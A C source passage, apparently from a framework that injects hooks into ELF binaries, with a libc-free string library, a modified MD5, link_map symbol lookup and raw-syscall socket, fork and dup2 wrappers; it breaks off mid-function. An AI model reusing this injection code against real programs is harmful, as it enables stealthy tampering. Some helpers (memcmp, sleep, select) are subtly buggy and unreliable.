#include "config.h"
#include "hook.h"
#include <stddef.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include "errno.h"
#include "md5.h"
#include <stdarg.h>

#include <sys/select.h>
/* According to earlier standards */
#include <sys/time.h>
#include <sys/types.h>
#include <elf.h>




#ifdef __x86_64__
#include "x64_syscall.h"
#include "loader_x64.h"
#elif __i386__
#include "x86_syscall.h"
#include "loader_x86.h"
#elif __arm__
#include "arm_syscall.h"
#include "loader_arm.h"
#elif __aarch64__
#include "aarch64_syscall.h"
#include "loader_aarch64.h"
#elif __mips__
#include "mips_syscall.h"
#include "loader_mips.h"
#endif

#if(PATCH_DEBUG == 1)
#define IN_LINE static
#define DEBUG_LOG(format,...) my_printf("[DEBUG]:"format"\n",##__VA_ARGS__)
#else
#define IN_LINE static inline __attribute__((always_inline))
#define DEBUG_LOG(format,...)
#endif



#define UN_KNOWN_ERROR_CODE 0xFF99FF99

#define MAX_PATCH_NUM 0x100

enum CODE_SLOT_TYPE{
    SLOT_GOT= 1,
    SLOT_FUNCTION,
    SLOT_CALL
};

typedef struct PATCH_CODE_SLOT{
    void* patch_addr;
    enum CODE_SLOT_TYPE slot_type;
    int hook_code_len;
    unsigned char hook_code[0x20];
    int code_slot_len;
    unsigned char code_slot[0x20];
    int old_code_save_len;
    unsigned char old_code_save[0x20];
}PATCH_CODE_SLOT;

static PATCH_CODE_SLOT* g_patch_code_slot;
static int g_patch_code_index;
static char* g_elf_base = 0;
static LOADER_STAGE_THREE g_loader_param;

IN_LINE char* get_elf_base(){
    return g_elf_base;
}

IN_LINE PATCH_CODE_SLOT* search_patch_code_slot(void* key){
    int i = 0;
    if(g_patch_code_index < MAX_PATCH_NUM && g_patch_code_slot!=NULL){
        for(i=0;i<g_patch_code_index;i++){
            if(g_patch_code_slot[i].patch_addr == key)
                return &g_patch_code_slot[i];
        }
        return &g_patch_code_slot[g_patch_code_index++];
    }
    return NULL;
}

IN_LINE PATCH_CODE_SLOT* alloc_patch_code_slot(void* key){
    int i = 0;
    if(g_patch_code_index < MAX_PATCH_NUM && g_patch_code_slot!=NULL){
        for(i=0;i<g_patch_code_index;i++){
            if(g_patch_code_slot[i].patch_addr == key)
                return &g_patch_code_slot[i];
        }
        return &g_patch_code_slot[g_patch_code_index++];
    }
    return NULL;
}

IN_LINE void dealloc_patch_code_slot(){
    int i = 0;
    if(g_patch_code_index < MAX_PATCH_NUM && g_patch_code_slot!=NULL &&  g_patch_code_index>0){
        g_patch_code_index -- ;
    }
}


IN_LINE unsigned long divmod(unsigned long large,unsigned long mod){
    while(large>=mod)
        large = large - mod;
    return large;
}

IN_LINE int is_pie(char* elf_base){
    Elf_Ehdr * ehdr = (Elf_Ehdr*) elf_base;
    if(ehdr->e_type == ET_EXEC)
        return 0;
    else if(ehdr->e_type == ET_DYN)
        return 1;
    return -1;
}


IN_LINE int  my_strlen(const char *src){
    int i = 0;
    while(src[i]!='\0')
        i++;
    return i;
}

IN_LINE char* my_strchr(char* src,char chr){
    int i = 0;
    while(src[i]!='\0' && src[i]!=chr)
        i++;
    return &src[i];
}

IN_LINE char* my_memchr(char* src,char chr,int len){
    int i = 0;
    while(src[i]!=chr && i < len)
        i++;
    return &src[i];
}


#ifndef ULONG_MAX
#define	ULONG_MAX	((unsigned long)(~0L))		/* 0xFFFFFFFF */
#endif

#ifndef LONG_MAX
#define	LONG_MAX	((long)(ULONG_MAX >> 1))	/* 0x7FFFFFFF */
#endif

#ifndef LONG_MIN
#define	LONG_MIN	((long)(~LONG_MAX))		/* 0x80000000 */
#endif

/*
 * Convert a string to a long integer.
 *
 * Ignores `locale' stuff.  Assumes that the upper and lower case
 * alphabets and digits are each contiguous.
 */
#define ISSPACE(X) ((X==' '))
#define ISDIGIT(X) ((X>='0' && X<='9'))
#define ISALPHA(X) (((X>='a'&& X<='z') || (X>='A' && X<='Z')))
#define ISUPPER(X) ((X>='A' && X<='Z'))

IN_LINE long my_strtol(const char *nptr, char **endptr, register int base)
{
    register const char *s = nptr;
    register unsigned long acc;
    register int c;
    register unsigned long cutoff;
    register int neg = 0, any, cutlim;

    /*
     * Skip white space and pick up leading +/- sign if any.
     * If base is 0, allow 0x for hex and 0 for octal, else
     * assume decimal; if base is already 16, allow 0x.
     */
    do {
        c = *s++;
    } while (ISSPACE(c));
    if (c == '-') {
        neg = 1;
        c = *s++;
    } else if (c == '+')
        c = *s++;
    if ((base == 0 || base == 16) &&
        c == '0' && (*s == 'x' || *s == 'X')) {
        c = s[1];
        s += 2;
        base = 16;
    }
    if (base == 0)
        base = c == '0' ? 8 : 10;

    /*
     * Compute the cutoff value between legal numbers and illegal
     * numbers.  That is the largest legal value, divided by the
     * base.  An input number that is greater than this value, if
     * followed by a legal input character, is too big.  One that
     * is equal to this value may be valid or not; the limit
     * between valid and invalid numbers is then based on the last
     * digit.  For instance, if the range for longs is
     * [-2147483648..2147483647] and the input base is 10,
     * cutoff will be set to 214748364 and cutlim to either
     * 7 (neg==0) or 8 (neg==1), meaning that if we have accumulated
     * a value > 214748364, or equal but the next digit is > 7 (or 8),
     * the number is too big, and we will return a range error.
     *
     * Set any if any `digits' consumed; make it negative to indicate
     * overflow.
     */
    cutoff = neg ? -(unsigned long)LONG_MIN : LONG_MAX;
    cutlim = cutoff % (unsigned long)base;
    cutoff /= (unsigned long)base;
    for (acc = 0, any = 0;; c = *s++) {
        if (ISDIGIT(c))
            c -= '0';
        else if (ISALPHA(c))
            c -= ISUPPER(c) ? 'A' - 10 : 'a' - 10;
        else
            break;
        if (c >= base)
            break;
        if (any < 0 || acc > cutoff || (acc == cutoff && c > cutlim))
            any = -1;
        else {
            any = 1;
            acc *= base;
            acc += c;
        }
    }
    if (any < 0) {
        acc = neg ? LONG_MIN : LONG_MAX;
    } else if (neg)
        acc = -acc;
    if (endptr != 0)
        *endptr = (char *) (any ? s - 1 : nptr);
    return (acc);
}


IN_LINE char* my_strstr( char* dest,  char* src) {
    char *tdest = dest;
    char *tsrc = src;
    int i = 0;//tdest 主串的元素下标位置，从下标0开始找，可以通过变量进行设置，从其他下标开始找！
    int j = 0;//tsrc 子串的元素下标位置
    while (i <= my_strlen(tdest) - 1 && j <= my_strlen(tsrc) - 1) {
        if (tdest[i] == tsrc[j])//字符相等，则继续匹配下一个字符
        {
            i++;
            j++;
        } else//在匹配过程中发现有一个字符和子串中的不等，马上回退到 下一个要匹配的位置
        {
            i = i - j + 1;
            j = 0;
        }
    }
    //循环完了后j的值等于strlen(tsrc) 子串中的字符已经在主串中都连续匹配到了
    if (j == my_strlen(tsrc)) {
        return tdest + i - my_strlen(tsrc);
    }
    return NULL;
}



IN_LINE void my_strcpy(char *dst, char *src,char end){
    int i = 0;
    while(src[i]!=end && src[i]!='\0'){
        dst[i] = src[i];
        i++;
    }
    dst[i] = '\0';
}

IN_LINE int  my_strcmp(char *dst, char *src){
    int i = 0;
    if(my_strlen(dst)!=my_strlen(src))
        return -1;
    while(dst[i]!='\0'){
        if(dst[i] > src[i])
            return 1;
        else if(dst[i] < src[i])
            return -1;
        i++;
    }
    return 0;
}

#define __tolower(c) ((('A' <= (c))&&((c) <= 'Z')) ? ((c) - 'A' + 'a') : (c))

/*
IN_LINE int strcasecmp(const char *s1, const char *s2)
{
    const unsigned char *p1 = (const unsigned char *) s1;
    const unsigned char *p2 = (const unsigned char *) s2;
    int result = 0;

    if (p1 == p2)
    {
     return 0;
    }

    while ((result = __tolower(*p1) - __tolower(*p2)) == 0)
     {
     if (*p1++ == '\0')
     {
       break;
     }
    p2++;
    }
  return result;
}
*/
IN_LINE int my_strcasecmp(const char* s1, const char* s2)
{
   char c1, c2;
   do { c1 = *s1++; c2 = *s2++; }
   while (c1 && c2 && (__tolower(c1) == __tolower(c2)));

    return __tolower(c1) - __tolower(c2);
 }

 /*****************************************************************************/
 /* STRNCASECMP() - Case-insensitive strncmp.                                 */
 /*****************************************************************************/
IN_LINE int my_strncasecmp(const char* s1, const char* s2, size_t n)
 {
    char c1, c2;

    if (!n) return 0;

    do { c1 = *s1++; c2 = *s2++; }
    while (--n && c1 && c2 && (__tolower(c1) == __tolower(c2)));

    return __tolower(c1) - __tolower(c2);
 }


IN_LINE int  my_memcmp(void *dst, void *src,int len){
    int i = 0;
    while(i<len){
        if( ((char*)dst)[i] > ((char*)src)[i])
            return 1;
        else if( ((char*)dst)[i] > ((char*)src)[i])
            return -1;
        i++;
    }
    return 0;
}
IN_LINE void my_memset(void *dst,char chr,int len){
    int i = 0;
    for(i=0;i<len;i++)
        ((char*)dst)[i] = chr;
}
IN_LINE int  my_memcpy(void *dst, void *src,int len){
    int i = 0;
    while(i<len){
        ((char*)dst)[i] = ((char*)src)[i];
        i++;
    }
    return 0;
}

static unsigned char PADDING[]={0x80,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
                                0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
                                0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
                                0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};

IN_LINE void MD5Init(MD5_CTX *context)
{
    context->count[0] = 0;
    context->count[1] = 0;
    context->state[0] = 0x12345678;
    context->state[1] = 0xEFDACB89;
    context->state[2] = 0xA8ADDCFE;
    context->state[3] = 0x1A325476;
}


IN_LINE void MD5Encode(unsigned char *output,unsigned int *input,unsigned int len)
{
    unsigned int i = 0,j = 0;
    while(j < len)
    {
        output[j] = input[i] & 0xFF;
        output[j+1] = (input[i] >> 8) & 0xFF;
        output[j+2] = (input[i] >> 16) & 0xFF;
        output[j+3] = (input[i] >> 24) & 0xFF;
        i++;
        j+=4;
    }
}

IN_LINE void MD5Decode(unsigned int *output,unsigned char *input,unsigned int len)
{
    unsigned int i = 0,j = 0;
    while(j < len)
    {
        output[i] = (input[j]) |
                    (input[j+1] << 8) |
                    (input[j+2] << 16) |
                    (input[j+3] << 24);
        i++;
        j+=4;
    }
}

IN_LINE void MD5Transform(unsigned int state[4],unsigned char block[64])
{
    unsigned int a = state[0];
    unsigned int b = state[1];
    unsigned int c = state[2];
    unsigned int d = state[3];
    unsigned int x[64];
    my_memset((char*)x,0,64);
    MD5Decode(x,block,64);
    FF(a, b, c, d, x[ 0], 7, 0xd76aa478); /* 1 */
    FF(d, a, b, c, x[ 1], 12, 0xe8c7b756); /* 2 */
    FF(c, d, a, b, x[ 2], 17, 0x242070db); /* 3 */
    FF(b, c, d, a, x[ 3], 22, 0xc1bdceee); /* 4 */
    FF(a, b, c, d, x[ 4], 7, 0xf57c0faf); /* 5 */
    FF(d, a, b, c, x[ 5], 12, 0x4787c62a); /* 6 */
    FF(c, d, a, b, x[ 6], 17, 0xa8304613); /* 7 */
    FF(b, c, d, a, x[ 7], 22, 0xfd469501); /* 8 */
    FF(a, b, c, d, x[ 8], 7, 0x698098d8); /* 9 */
    FF(d, a, b, c, x[ 9], 12, 0x8b44f7af); /* 10 */
    FF(c, d, a, b, x[10], 17, 0xffff5bb1); /* 11 */
    FF(b, c, d, a, x[11], 22, 0x895cd7be); /* 12 */
    FF(a, b, c, d, x[12], 7, 0x6b901122); /* 13 */
    FF(d, a, b, c, x[13], 12, 0xfd987193); /* 14 */
    FF(c, d, a, b, x[14], 17, 0xa679438e); /* 15 */
    FF(b, c, d, a, x[15], 22, 0x49b40821); /* 16 */

    /* Round 2 */
    GG(a, b, c, d, x[ 1], 5, 0xf61e2562); /* 17 */
    GG(d, a, b, c, x[ 6], 9, 0xc040b340); /* 18 */
    GG(c, d, a, b, x[11], 14, 0x265e5a51); /* 19 */
    GG(b, c, d, a, x[ 0], 20, 0xe9b6c7aa); /* 20 */
    GG(a, b, c, d, x[ 5], 5, 0xd62f105d); /* 21 */
    GG(d, a, b, c, x[10], 9,  0x2441453); /* 22 */
    GG(c, d, a, b, x[15], 14, 0xd8a1e681); /* 23 */
    GG(b, c, d, a, x[ 4], 20, 0xe7d3fbc8); /* 24 */
    GG(a, b, c, d, x[ 9], 5, 0x21e1cde6); /* 25 */
    GG(d, a, b, c, x[14], 9, 0xc33707d6); /* 26 */
    GG(c, d, a, b, x[ 3], 14, 0xf4d50d87); /* 27 */
    GG(b, c, d, a, x[ 8], 20, 0x455a14ed); /* 28 */
    GG(a, b, c, d, x[13], 5, 0xa9e3e905); /* 29 */
    GG(d, a, b, c, x[ 2], 9, 0xfcefa3f8); /* 30 */
    GG(c, d, a, b, x[ 7], 14, 0x676f02d9); /* 31 */
    GG(b, c, d, a, x[12], 20, 0x8d2a4c8a); /* 32 */

    /* Round 3 */
    HH(a, b, c, d, x[ 5], 4, 0xfffa3942); /* 33 */
    HH(d, a, b, c, x[ 8], 11, 0x8771f681); /* 34 */
    HH(c, d, a, b, x[11], 16, 0x6d9d6122); /* 35 */
    HH(b, c, d, a, x[14], 23, 0xfde5380c); /* 36 */
    HH(a, b, c, d, x[ 1], 4, 0xa4beea44); /* 37 */
    HH(d, a, b, c, x[ 4], 11, 0x4bdecfa9); /* 38 */
    HH(c, d, a, b, x[ 7], 16, 0xf6bb4b60); /* 39 */
    HH(b, c, d, a, x[10], 23, 0xbebfbc70); /* 40 */
    HH(a, b, c, d, x[13], 4, 0x289b7ec6); /* 41 */
    HH(d, a, b, c, x[ 0], 11, 0xeaa127fa); /* 42 */
    HH(c, d, a, b, x[ 3], 16, 0xd4ef3085); /* 43 */
    HH(b, c, d, a, x[ 6], 23,  0x4881d05); /* 44 */
    HH(a, b, c, d, x[ 9], 4, 0xd9d4d039); /* 45 */
    HH(d, a, b, c, x[12], 11, 0xe6db99e5); /* 46 */
    HH(c, d, a, b, x[15], 16, 0x1fa27cf8); /* 47 */
    HH(b, c, d, a, x[ 2], 23, 0xc4ac5665); /* 48 */

    /* Round 4 */
    II(a, b, c, d, x[ 0], 6, 0xf4292244); /* 49 */
    II(d, a, b, c, x[ 7], 10, 0x432aff97); /* 50 */
    II(c, d, a, b, x[14], 15, 0xab9423a7); /* 51 */
    II(b, c, d, a, x[ 5], 21, 0xfc93a039); /* 52 */
    II(a, b, c, d, x[12], 6, 0x655b59c3); /* 53 */
    II(d, a, b, c, x[ 3], 10, 0x8f0ccc92); /* 54 */
    II(c, d, a, b, x[10], 15, 0xffeff47d); /* 55 */
    II(b, c, d, a, x[ 1], 21, 0x85845dd1); /* 56 */
    II(a, b, c, d, x[ 8], 6, 0x6fa87e4f); /* 57 */
    II(d, a, b, c, x[15], 10, 0xfe2ce6e0); /* 58 */
    II(c, d, a, b, x[ 6], 15, 0xa3014314); /* 59 */
    II(b, c, d, a, x[13], 21, 0x4e0811a1); /* 60 */
    II(a, b, c, d, x[ 4], 6, 0xf7537e82); /* 61 */
    II(d, a, b, c, x[11], 10, 0xbd3af235); /* 62 */
    II(c, d, a, b, x[ 2], 15, 0x2ad7d2bb); /* 63 */
    II(b, c, d, a, x[ 9], 21, 0xeb86d391); /* 64 */
    state[0] += a;
    state[1] += b;
    state[2] += c;
    state[3] += d;
}

IN_LINE void MD5Update(MD5_CTX *context,unsigned char *input,unsigned int inputlen)
{
    unsigned int i = 0,index = 0,partlen = 0;
    index = (context->count[0] >> 3) & 0x3F;
    partlen = 64 - index;
    context->count[0] += inputlen << 3;
    if(context->count[0] < (inputlen << 3))
        context->count[1]++;
    context->count[1] += inputlen >> 29;

    if(inputlen >= partlen)
    {
        my_memcpy(&context->buffer[index],input,partlen);
        MD5Transform(context->state,context->buffer);
        for(i = partlen;i+64 <= inputlen;i+=64)
            MD5Transform(context->state,&input[i]);
        index = 0;
    }
    else
    {
        i = 0;
    }
    my_memcpy(&context->buffer[index],&input[i],inputlen-i);
}

IN_LINE void MD5Final(MD5_CTX *context,unsigned char digest[16])
{
    unsigned int index = 0,padlen = 0;
    unsigned char bits[8];
    index = (context->count[0] >> 3) & 0x3F;
    padlen = (index < 56)?(56-index):(120-index);
    MD5Encode(bits,context->count,8);
    MD5Update(context,PADDING,padlen);
    MD5Update(context,bits,8);
    MD5Encode(digest,context->state,16);
}

IN_LINE char* ELF_ADDR_ADD(char* elf_base,long p_vaddr){
    if(is_pie(elf_base))
        return elf_base + p_vaddr;
    else
        return (char*)p_vaddr;
}

IN_LINE int check_elf_magic(void* elf_base){
    int ret = ((*(char*)elf_base)=='\x7f' &&(*((char*)elf_base+1))=='E' && (*((char*)elf_base+2))=='L' && (*((char*)elf_base+3))=='F')?0:-1;
    return ret;
}

IN_LINE Elf_Dyn* get_elf_dyn_by_type(void* elf_base,int type){
    Elf_Ehdr* ehdr= (Elf_Ehdr*)elf_base;
    if(check_elf_magic(elf_base) == -1)
        return NULL;
    int j = 0;
    for(int i=0;i<ehdr->e_phnum;i++){
        Elf_Phdr* phdr = (Elf_Phdr*)((char*)ehdr+ehdr->e_phoff+ehdr->e_phentsize*i);
        switch (phdr->p_type)
        {
            case PT_DYNAMIC:
                j = 0;
                while(1){
                    Elf_Dyn* dyn = (Elf_Dyn*)(ELF_ADDR_ADD(elf_base,(long)phdr->p_vaddr+j*sizeof(Elf_Dyn)));
                    if(dyn->d_tag == type){
                        return dyn;
                    }
                    if(dyn->d_tag == 0)
                        break;
                    j++;
                }
                break;
            case PT_LOAD:
                break;
            default:
                break;
        }
    }
    return NULL;
}

IN_LINE void* get_elf_linkmap_from_plt_got(void* elf_base){
    Elf_Ehdr* ehdr= (Elf_Ehdr*)elf_base;
    if(check_elf_magic(elf_base) == -1)
        return NULL;
    int j = 0;
    for(int i=0;i<ehdr->e_phnum;i++){
        Elf_Phdr* phdr = (Elf_Phdr*)((char*)ehdr+ehdr->e_phoff+ehdr->e_phentsize*i);
        switch (phdr->p_type)
        {
            case PT_DYNAMIC:
                j = 0;
                while(1){
                    Elf_Dyn* dyn = (Elf_Dyn*)(ELF_ADDR_ADD(elf_base,(long)phdr->p_vaddr+j*sizeof(Elf_Dyn)));
                    if(dyn->d_tag == DT_PLTGOT){
                        struct link_map ** link = (struct link_map** )(dyn->d_un.d_ptr + sizeof(long));
                        return *link;
                    }
                    if(dyn->d_tag == 0)
                        break;
                    j++;
                }
                break;
            case PT_LOAD:
                break;
            default:
                break;
        }
    }
    return NULL;
}

IN_LINE void* get_elf_linkmap_from_dt_debug(void* elf_base) {
    Elf_Dyn* dyn = get_elf_dyn_by_type(elf_base,DT_DEBUG);
    if(dyn == NULL)
        return NULL;
    struct r_debug* debug =  (struct r_debug*)dyn->d_un.d_val;
    return debug->r_map;
}

IN_LINE unsigned long dl_new_hash(const char *s)
{
    unsigned long h = 5381;
    unsigned char c;
    for (c = *s; c != '\0'; c = *++s)
        h = h * 33 + c;
    return h & 0xffffffff;
}

IN_LINE Elf_Sym *find_symbol_in_lib_fast(char *symbols,char * elf_base){
    unsigned int new_hash, h2;
    unsigned int hb1, hb2;
    unsigned int nbuckets, symndx, nmaskwords, shift2;
    unsigned long n;
    long addr;
    long bitmask_addr,hashbuckets_addr, hashvalues_addr;
    Elf_Dyn* dt_gnu_hash = get_elf_dyn_by_type(elf_base,DT_GNU_HASH);
    long sym_addr, hash_addr;
    long dynsym_addr,dynstr_addr;
    ElfW(Sym) sym;
    if(dt_gnu_hash == NULL)
        return NULL;
    if(get_elf_dyn_by_type(elf_base,DT_SYMTAB) == NULL)
        return NULL;
    if(get_elf_dyn_by_type(elf_base,DT_STRTAB) == NULL)
        return NULL;
    if(get_elf_dyn_by_type(elf_base,DT_GNU_HASH) == NULL)
        return NULL;
    if(dt_gnu_hash->d_un.d_val == 0 ){
        return NULL;
    }
    //bugs for linux_gate and vdso
    if(dt_gnu_hash->d_un.d_val<=FAKE_MIN_ADDR)
        return NULL;
    nbuckets = *(int*)(dt_gnu_hash->d_un.d_val);
    symndx = *(int*)(dt_gnu_hash->d_un.d_val + sizeof(unsigned int));
    nmaskwords = *(int*)(dt_gnu_hash->d_un.d_val + 2*sizeof(unsigned int));
    shift2 = *(int*)(dt_gnu_hash->d_un.d_val + 3*sizeof(unsigned int));
    bitmask_addr = (long)dt_gnu_hash->d_un.d_val + 4*sizeof(unsigned int);
    hashbuckets_addr = bitmask_addr + nmaskwords * sizeof(long);
    hashvalues_addr = hashbuckets_addr + nbuckets*sizeof(unsigned int);

    dynstr_addr = (long)get_elf_dyn_by_type(elf_base,DT_STRTAB)->d_un.d_val;
    dynsym_addr = (long)get_elf_dyn_by_type(elf_base,DT_SYMTAB)->d_un.d_val;
    new_hash = dl_new_hash(symbols);
    hb1 = new_hash & (__ELF_NATIVE_CLASS - 1);
    hb2 = (new_hash >> shift2) & (__ELF_NATIVE_CLASS - 1);
    n = (new_hash / __ELF_NATIVE_CLASS) & (nmaskwords - 1);
    /*
#if __ELF_NATIVE_CLASS == 64
        n = (new_hash >> 6) & (nmaskwords - 1);
#elif __ELF_NATIVE_CLASS == 32
        n = (new_hash >> 5) & (nmaskwords - 1);
#else
#error "unknown __ELF_NATIVE_CLASS"
#endif
     */
    addr = bitmask_addr + n * sizeof(long);
    long bitmask_word = *(long*)addr;
    if (((bitmask_word >> hb1) & (bitmask_word >> hb2) & 1) == 0)
        return NULL;
    addr = hashbuckets_addr + (new_hash % nbuckets) * sizeof(Elf_Symndx);
    //addr = hashbuckets_addr + (unsigned int)(divmod(new_hash ,nbuckets) * sizeof(Elf_Symndx));
    Elf_Symndx _symndx = *(Elf_Symndx*)addr;
    if (_symndx == 0)
        return NULL;
    sym_addr = dynsym_addr + _symndx * sizeof(ElfW(Sym));
    hash_addr = hashvalues_addr + (_symndx - symndx) * sizeof(unsigned int);
    do
    {
        h2 = *(unsigned int*)hash_addr;
        /*1. hash value same */
        if (((h2 ^ new_hash) >> 1) == 0)
        {
            sym_addr = dynsym_addr + ((symndx + (hash_addr - hashvalues_addr) / sizeof(Elf32_Word)) * sizeof(ElfW(Sym)));
            //sym_addr = dynsym_addr + ((symndx + (hash_addr - hashvalues_addr) >> 2) * sizeof(ElfW(Sym)));
            /*read ElfW(Sym) */
            my_memcpy((char*)&sym,(char*)sym_addr,sizeof(ElfW(Sym)));
            addr = dynstr_addr + sym.st_name;

            if (((char*)addr)[0]!='\x00' && (!my_strcmp((char*)addr, symbols)))
            {
                return (Elf_Sym*)sym_addr;
            }
        }
        hash_addr += sizeof(unsigned int);
    } while ((h2 & 1u) == 0); // search in same bucket
    return NULL;
}


IN_LINE void* find_symbol_in_lib_slow(char *symbols,char * elf_base){
    Elf_Dyn* strtab = get_elf_dyn_by_type(elf_base,DT_STRTAB);
    Elf_Dyn* symtab = get_elf_dyn_by_type(elf_base,DT_SYMTAB);
    Elf_Dyn* dt_strsz = get_elf_dyn_by_type(elf_base,DT_STRSZ);
    if(strtab == NULL || symtab == NULL || dt_strsz == NULL)
        return NULL;
    if(symtab->d_un.d_ptr<=FAKE_MIN_ADDR || strtab->d_un.d_ptr<=FAKE_MIN_ADDR)
        return NULL;
    long strtab_size = dt_strsz->d_un.d_val;
    int i = 0;
    while(1){
        Elf_Sym* sym = (Elf_Sym*)(symtab->d_un.d_ptr + i*sizeof(Elf_Sym));
        if(sym->st_name>=strtab_size)
            break;
        char* sym_name = (char*)&((char*)strtab->d_un.d_ptr)[sym->st_name];
        if(my_strcmp(sym_name,symbols)==0)
            return sym;
        i++;
    }
    return NULL;
}

IN_LINE void* lookup_symbools_from_dynamic_symbol(char* symbols,void* elf_base){
    Elf_Sym* sym;
    void* sym_addr = NULL;
    sym = find_symbol_in_lib_fast(symbols,elf_base);
    if (sym) {
        sym_addr = sym->st_value + elf_base;
        return sym_addr;
    }
    /*
    sym = find_symbol_in_lib_slow(symbols,elf_base);
    if (sym) {
        sym_addr = sym->st_value + elf_base;
        return sym_addr;
    }*/
    return NULL;
}

IN_LINE void* lookup_symbols_in_elf(unsigned char* symbols,void* elf_base){
    int i = 0, j = 0;
    if(symbols==NULL || elf_base==NULL)
        return NULL;
    if(check_elf_magic(elf_base)==-1)
        return NULL;
    return lookup_symbools_from_dynamic_symbol(symbols,elf_base);
}

IN_LINE  void* lookup_symbols(char* symbol){
    struct link_map* map = get_elf_linkmap_from_plt_got(get_elf_base());
    if(map == NULL){
        map = get_elf_linkmap_from_dt_debug(get_elf_base());
    }
    if(map == NULL)
        return NULL;
    while(map->l_prev!=NULL) map = map->l_prev;
    void* sym_addr = 0;
    char vdso[] = {"[vdso]"};
    char linux_vdso[] = {"linux-vdso.so.1"};
    char linux_gate[] = {"linux-gate.so.1"};
    while (!sym_addr && map){
        char* so_name = map->l_name;
        if(my_strstr(so_name,vdso)!=NULL||my_strstr(so_name,linux_vdso)!=NULL ||my_strstr(so_name,linux_gate)!=NULL){
            map = map->l_next;
            continue;
        }
        if(map->l_addr == 0){
            map = map->l_next;
            continue;
        }
        sym_addr = (void*)lookup_symbols_in_elf(symbol,(char*)map->l_addr);
        if(sym_addr!=NULL)
            return sym_addr;
        map = map->l_next;
    }
}

IN_LINE void* hook_address_helper(void* addr){
    if(is_pie(get_elf_base()))
        return (void*)((long)get_elf_base() + (long)addr);
    return addr;
}



IN_LINE void my_sleep(int milli_second){
    struct timespec slptm;
    int tmp = 0;
    int res = 0;
    slptm.tv_sec = milli_second >> 10;
    tmp = milli_second % 1000;
    slptm.tv_nsec = tmp * 1000000;
    asm_nanosleep((void*)&slptm,0,res);
}

IN_LINE void filter_black_words_in(char* buf,int buf_len){

}
IN_LINE void filter_black_words_out(char* buf,int buf_len){

}
static int*(*g_errno_handler)() ;
static int get_errno(){
    if(g_errno_handler == NULL) {
        g_errno_handler= lookup_symbols("__errno_location");
        if (g_errno_handler != NULL)
            return *(g_errno_handler());
    }
    return UN_KNOWN_ERROR_CODE;
}

#define SYSCALL_DYNAMIC 0

IN_LINE long my_dup2(int oldfd,int newfd){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*dup2_handler)(int, int) = lookup_symbols("dup2");
        if (dup2_handler != NULL) {
            return dup2_handler(oldfd, newfd);
        }
    }
    asm_dup2(oldfd, newfd, res);
    return res;
}

IN_LINE long my_pipe(int* fd){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*pip2_handler)(int *) = lookup_symbols("pipe");
        if (pip2_handler != NULL) {
            return pip2_handler(fd);
        }
    }
    asm_pipe(fd,res);
    return res;
}


IN_LINE long my_close(int fd){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*close_handler)(int) = lookup_symbols("close");
        if (close_handler != NULL) {
            return close_handler(fd);
        }
    }
    asm_close(fd,res);
    return res;
}

IN_LINE long my_fork(){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*fork_handler)() = lookup_symbols("fork");
        if (fork_handler != NULL) {
            return fork_handler();
        }
    }
    asm_fork(res);
    return res;
}


IN_LINE long my_fcntl(int fd,long cmd,long flag){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*fcntl_handler)(int, long, long) = lookup_symbols("fcntl");
        if (fcntl_handler != NULL) {
            return fcntl_handler(fd, cmd, flag);
        }
    }
    asm_fcntl(fd,cmd,flag,res);
    return res;
}

static long my_socket(long af,long type,long flag){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*socket_handler)(long, long, long) = lookup_symbols("socket");
        if (socket_handler != NULL) {
            return socket_handler(af, type, flag);
        }
    }
    asm_socket(af,type,flag,res);
    return res;
}

static long my_connect(int fd,void* addr,long size){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*connect_handler)(int,void*,long) = lookup_symbols("connect");
        if (connect_handler != NULL) {
            return connect_handler(fd, addr, size);
        }
    }
    asm_connect(fd,addr,size,res);
    return res;
}

IN_LINE long my_open(char* name,long mode,long flag){
    long res = 0;
    if(0) {
        long (*open_handler)(char*, long, long) = lookup_symbols("open");
        if (open_handler != NULL) {
            return open_handler(name, mode, flag);
        }
    }
    asm_open(name,mode,flag,res);
    return res;
}


IN_LINE long my_read(int fd,char* buf,long length){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*read_handler)(int, char *, long) = lookup_symbols("read");
        if (read_handler != NULL) {
            return read_handler(fd, buf, length);
        }
    }
    asm_read(fd,buf,length,res);
    return res;
}

IN_LINE long my_write(int fd,const char* buf,long length){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*write_handler)(int,const char *, long) = lookup_symbols("write");
        if (write_handler != NULL) {
            return write_handler(fd, buf, length);
        }
    }
    asm_write(fd,buf,length,res);
    return res;
}

static long my_send(int fd,char* buf,long size,long flag){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*connect_handler)(int,char*,long,long) = lookup_symbols("send");
        if (connect_handler != NULL) {
            return connect_handler(fd, buf, size,flag);
        }
    }
    asm_send(fd,buf,size,flag,res);

    return res;
}

static long my_setsockopt(long sockfd, long level, long optname, void *optval, long optlen){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*setsockopt_handler)(int, int, int, void*, long) = lookup_symbols("setsockopt");
        if (setsockopt_handler != NULL) {
            return setsockopt_handler(sockfd, level, optname, optval, optlen);
        }
    }
    asm_setsockopt(sockfd, level, optname, optval, optlen,res);
    return res;
}

static long my_sendto(int fd,char* buf,long size,long flag,void* addr,long addr_length){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*sendto_handler)(int, char *, long, long, void *, long) = lookup_symbols("sendto");
        if (sendto_handler != NULL) {
            return sendto_handler(fd, buf, size, flag, addr, addr_length);
        }
    }
    asm_sendto(fd,buf,size,flag,addr,addr_length,res);
    return res;
}

static long my_select(int nfds,fd_set *readafds,fd_set* writefds,fd_set* exceptfds,struct timeval* timeout){
    long res = 0;
    if(SYSCALL_DYNAMIC) {
        long (*select_handler)(int,fd_set*,fd_set*,fd_set*,struct timeval*) = lookup_symbols("sendto");
        if (select_handler != NULL) {
